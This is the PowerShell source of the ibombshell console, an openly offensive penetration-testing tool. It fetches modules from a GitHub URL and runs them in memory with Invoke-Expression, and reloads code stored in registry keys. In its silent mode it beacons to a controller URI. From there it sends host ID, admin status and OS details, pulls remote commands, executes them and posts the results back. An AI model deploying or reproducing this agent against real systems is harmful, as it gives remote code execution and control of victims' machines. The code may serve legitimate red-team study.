

function console{
 
    param(
        [Switch] $Silently,
        [String] $uriConsole,
        [String] $id
    )

     if ($PSVersionTable.PSVersion.Major -lt 3) {
	  return "Upgrade your powershell to version 3 or higher"
    }

    function loader{
        param(
            [Parameter(Mandatory)]
            [string] $command,
            [Parameter(Mandatory)]
            [string] $RawBase,
            [Parameter(Mandatory)]
            [string] $RawFunctions
        )

        $RawURL = $RawBase + $RawFunctions + $command

        return (iwr -UseBasicParsing -Headers @{"Cache-Control"="no-cache"}  -uri $RawURL).Content

    }

    $banner = "
      ,--.!,    _ ____                  __   _____ __         ____
   __/   -*-   (_) __ )____  ____ ___  / /_ / ___// /_  ___  / / /
 ,d08b.  '|``  / / __  / __ \/ __ ``__ \/ __ \\__ \/ __ \/ _ \/ / /
 0088MM      / / /_/ / /_/ / / / / / / /_/ /__/ / / / /  __/ / /
 ``9MMP'     /_/_____/\____/_/ /_/ /_/_.___/____/_/ /_/\___/_/_/"

    
    #Important: URL download ibombshell
    $gtRawBase = "https://raw.githubusercontent.com/ElevenPaths/ibombshell/Dev/"
    $gtRawFunctions = "data/functions/"
    $functionsList = "https://raw.githubusercontent.com/ElevenPaths/ibombshell/Dev/functions.txt"
    [System.Collections.ArrayList]$global:functionsLoaded = "showcommands" , "showfunctions" , "quit"
    [System.Collections.ArrayList]$global:internalFunctions =  "detect-OS", "printprompt" , "printMessage", "printData", "isadmin", "commandsearch", "addcommand"
    #Condition for exit
    $global:condition = $true



    if($Silently)
    {
        #To Review
	    $ErrorActionPreference = "SilentlyContinue"
        
        loader -command "generateid" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
        loader -command "isadmin" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
        if(-not($id))
        {
            $id = generateid
        }

        ## Getting system info
        if (isadmin){
            $admin = "admin"
        }else {
            $admin = "no"
        }

        $info = Get-CimInstance -ClassName Win32_OperatingSystem
        $os_version = $info.caption | Out-String
        $os_arch = $info.OSArchitecture | Out-String

        #i am new warrior
        if($uriConsole.Length -ne 0)
        {
            # Waiting for a successful connection
            while ($true)
            {
                try 
                {
                    $req = iwr -UseBasicParsing -Uri "$uriConsole/newibombshell/$id"
                    $data = "custominfo`n" + $id + "`n" + $admin + "`n" + $os_version + $os_arch
                    $req = iwr -UseBasicParsing -Method POST -Uri "$uriConsole/data-ibombshell/$id" -Body @{results=$data}
                    break
                }
                catch 
                {
                    sleep 5
                }
            }
        }
    }
    else{     
        $path = 'hkcu:\software\classes\ibombshell'
        if((Test-Path $path)){
            readfunctions  > $null
        }else{
            #loader functions default
            try{
                loader -command "system/detect-OS" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
                loader -command "showfunctions" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
                loader -command "showcommands" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
                loader -command "addcommand" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
                loader -command "commandsearch" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
                loader -command "quit" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
                loader -command "saveandloadfunctions" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
                loader -command "version" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
                loader -command "isadmin" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
                loader -command "print/printprompt" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
                loader -command "print/messagedata" -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
                addcommand -command "savefunctions" > $null
                addcommand -command "deletefunctionsreg" > $null
                addcommand -command "version" > $null
            }catch {
                
             }
        }

        try{
            #getting function's list
            $list = (new-object net.webclient).downloadstring($functionsList)
        }catch{
                write-host "Check Internet Connection"
                sleep 1
                $list = ""
        }

        $detected_os = detect-OS -basic 
        if($detected_os -eq "windows") {
	        $delimet = "`n"
            $delimet2 = "`r`n"
        } else {
            $delimet = "`n"
            $delimet2 = "`n"
        }
        $global:commandList = $list.split($delimet)
	    $localcommandlist = $list.split($delimet2)

        clear-host
        write-host -ForegroundColor Yellow $banner
        write-host 
        write-host -ForegroundColor Red "Use showcommands to see what can be loaded or showfunctions to see what can be run"
        write-host
    }

    $try_connection = 0
    
    while($global:condition)
    {

        if($Silently)
        {
            
            if($uriConsole.Length -ne 0)
            {
                try 
                {
                    $content = (iwr -UseBasicParsing -Uri "$uriConsole/ibombshell/$id").content 
                } 
                catch 
                {
                    $content = ""
                    $try_connection += 1
                    if ($try_connection -eq 5) 
                    {
                        # If the connection fails 5 attempts the console closes
                        break
                    }
                }

                if($content.length -gt 0)
                { 
                    $results = $content | iex
           
                    if (-not $results) {$results = "Completed"}
                    #Send results
                    if ($results.GetType().Name -ne "String")
                    {
                        $send = ""
                        foreach($i in $results)
                        {
                            $send = $send + $i + '\n'
                        }
                        $results = $send
                    }
                    iwr -UseBasicParsing -Method POST -Uri "$uriConsole/ibombshell/$id" -Body @{results=$results}
                } 

                
                sleep 5
            }
            else
            {
                sleep 5
            }
            
        }
        else
        {
            printprompt
            $command = Read-Host  
	        $command = $command.TrimStart()
            if(($command.Length -eq 0))
            {
                continue
            }
            if ($command -eq  "cls" -or $command -eq "clear") {
                cls | iex
                continue
            } 
            if ((commandsearch -command $command.split(" ")[0] -list $functionsLoaded)-and($command.Split(" ")[0].Equals("loaderext")))
            {
                $command | iex | iex
            }
            elseif (commandsearch -command $command.split(" ")[0] -list $functionsLoaded)
            {
                #$command
                $command | iex
            }
            elseif (commandsearch -command $command -list $localcommandlist)
            {
                try {
                    $result = addcommand -command $command 
                    if ($result -ne -1) {
                        #loader -command $command -RawBase $gtRawBase -RawFunctions $gtRawFunctions
                        loader -command $command -RawBase $gtRawBase -RawFunctions $gtRawFunctions | iex
                        printMessage -message "Function Loaded"
                    }else{
                    printMessage -message "That function is already loaded"
                    }
                } catch {
                    printMessage -message "Something went wrong loading the module"
                    printMessage -message "$_.Exception.Message"
                    $global:functionsLoaded.removeat($result)
                }
            }
            else
            {
                printMessage -message "Stupid Command!"
            }
        }
    }

}

# READFUNCTIONS BEGIN
function readFunctions{
            $path = 'HKCU:\Software\Classes\ibombshell'
            $path_internals = 'hkcu:\software\classes\ibombshell\internals'
            
            # Internal
            runRead -path $path_internals -isCommand $false 

            # No Internal
            runRead -path $path -isCommand $true              
}

function runRead{
        param(
            [Parameter(Mandatory)]
            [String] $path,
            [Parameter(Mandatory)]
            [Boolean] $isCommand
        )

        function giveNameFunctionReg{
            param(
                    [Parameter(Mandatory)]
                    [String] $SubKey
            )

            $max = $SubKey.Split("\").Length
            return $SubKey.Split("\")[$max-1]

        }

        if(test-path $path)
        {
            
            $listFunctions = (Get-ChildItem $path).Name
            $code = ""
            cd hkcu:

            foreach($i in $listFunctions)
            { 
                if ($i -ne "internals"){
                    $code = ""
                    $num = ((Get-Item -Path "$i" | Select-Object -ExpandProperty Property) | ForEach-Object {
                    New-Object psobject -Property @{"property"=$_;
                    "Value" = (Get-ItemProperty -Path "$i" -Name $_).$_}}).Value

                    foreach($j in $num){
                        $code += $j + "`r`n"}
                        write-host $code
                        $code | iex
                        if (($name -ne "internals") -and $isCommand) {
                            addCommand -command (giveNameFunctionReg -SubKey $i) > $null
                        } 
                    
                }
            }
                            
                c:

                return "done"
        }
} # READFUNCTIONS END